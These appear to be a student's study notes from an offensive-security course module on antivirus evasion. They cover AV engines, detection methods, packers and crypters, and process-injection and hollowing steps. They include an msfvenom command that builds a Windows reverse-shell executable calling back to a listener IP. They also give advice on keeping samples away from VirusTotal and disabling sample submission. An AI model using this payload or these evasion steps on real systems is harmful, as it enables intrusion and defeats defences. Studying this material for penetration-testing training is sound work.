## Known vs Unknown Threats

- VirusTotal
	- malware search engine
  - adds signatures to database [thats a bad thing]
- Usually have ML Engine
	- must be connected online
- EDR (Endpoint Detation and Response)
	- Responsible for generating security-event telemetry and forwarding it to a _Security Information and Event Management_ (SIEM)[6](https://portal.offsec.com/courses/pen-200/books-and-videos/modal/modules/antivirus-evasion/antivirus-software-key-components-and-operations/known-vs-unknown-threats#fn6) system, which collects data from every company host.

### AV Engines and Components
- fueled by signature updates fetched from the vendors signature database on the internet.
- Components
	- File Engine
		- scheduled and real-time file scans
		- real time requires kernel level scanner via mini-filter driver
	- Memory Engine
		- each process's memory space at runtime or suspicious API calls that might result in memory injection attacks
	- Network Engine
		- incoming/outgoing network traffic
		- if signature matched, might attempt to block malware C2
	- Disassembler
		- if trying to encrypt malware, AV can disassembling malware packers or ciphers & loading into sandbox or emulator
		- translate machine code into assembly language, reconstructing the orignal program section, and identifying any encoding/decoding routine
	- Emulator/Sandbox
		- runs malware to detect signatures
	- Browser Plugin
		- to detect malware that might be executed in the browser (Sandboxed)
	- Machine Learning Engine
		- in the cloud

### Detection Methods
- Signature-based Detection
	- restricted list technology
		- file system is scanned for known malware signatures, if detected, files are quarantined
		- signature can be just as simple as the hash of the file itself or a set of multiple patterns
		- Example:
			- xxd -b malware.txt
			- ```
kali@kali:~$ xxd -b malware.txt
00000000: 01101111 01100110 01100110 01110011 01100101 01100011  offsec
00000006: 00001010    
``
- [[xxd]]
	- left = binary offset, middle = binary representation, right = ASCII
	- sha256sum malware.txt
- Heuristic-based Detection
	- relies on various rules and algorithms to determine whether or not an action is considered malicious
	- achieved by stepping through the instruction set of a binary file or by attempting to disassemble the machine code and ultimately decompile and analyze the source code
	- search for various patterns and program calls (as opposed to simple byte sequences) that are considered malicious.
- Behavioral Detection
	- dynamically analyzes the behavior of a binary file
	- often achieved by executing the file in question in an emulated environment,and searching for behaviors or actions that are considered malicious.
- Machine Learning Detection
	- detect unknown threats by collecting and analyzing additional metadata.
	- Microsft Windows Defender
		- client ML Engine
			- creating ML models and heuristics
		- cloud ML engine
			- capable of analyzing the submitted sample against a metadata-based model comprised of all the submitted samples.
- Windows msfvenom example
	- msfvenom -p windows/shell_reverse_tcp LHOST=192.168.45.205 LPORT=5555 -f exe > binary.exe

### On-Disk Evasion
- packers
	- reduce the size of an executable
	- new hash signature and as a result, can effectively bypass older and more simplistic AV scanners
- Obfuscators
	- reorganize and mutate code
	- replacing instructions with semantically equivalent ones, inserting irrelevant instructions or _dead code_,[3](https://portal.offsec.com/courses/pen-200/books-and-videos/modal/modules/antivirus-evasion/bypassing-antivirus-detections/on-disk-evasion#fn3) splitting or reordering functions
	- modern ones can run in-memory
- Crypter
	- alters executable code, adding a decryption stub that restores the original code upon execution
	- decryption happens in-memory
	- encrypted code is the only thing on-disk
	- most effective
- anti-reversing
- anti-debugging
- virtual machine emulation detection
- anti-copy
- The Enigma Protector
	- commerical tool for bypassing AVs
### In-Memory Evasion
- In-memory Injections = PE injections
- Remote Process Memory Injection
	- inject the payload into another valid PE that is not malicious
	1. Windows APIs
	2. use OpenProcess to obtain a valid HANDLE
	3. get valid HANDLE to target process we have permissions to
	4. allocate memory in the context of that process by calling a Windows API such as VirtualAllocEx
	5. copy malicious payload to newly allocated memory using WriteProcessMemory
	6. execute in memory in a seperate thread using CreateRemoteThread
- Reflective DLL Injection
	- load a DLL stored by the attacker in the process memory
	- challenge
		- LoadLibrary does not support in-memory
		- must write their own version of the API that does not rely on a disk-based DLL
- Process Hollowing
	- launch a non-malicious process in a suspended state
	- the image of the process is removed from memory and replaced with a malicious executable image
	- the process is then resumed and malicious code is executed instead of the legitimate proces
- Inline hooking
		- employed by rootkits
			- dedicated and persistent access to the target system through modification of system components in user space, kernel, or even at lower OS protection rings13 such as boot or hypervisor
		
	- modifying memory and introducing a hook (an instruction that redirects the code execution) into a function to make it point to our malicious code
	- Upon executing our malicious code, the flow will return back to the modified function and resume execution, appearing as if only the original code had executed

### Testing for AV Evasion
- VirusTotal
	- *CAUTION* - sends malware signature to other vendors so AVs can be updated
	- may cause AV to block your new malware
- AntiScan.Me
	- claims it does not divulge any samples
- If TGT environment specifics are known
	- build a dedicated VM that resembles the customer environment
	- test
- Disable AV Automatic Sample Submission in Windows
	- Windows Security > Virus & threat protection > Manage Settings
- No internet = some advanced AV features inhibited
### Thread Injection
- [[Thread Injection]]



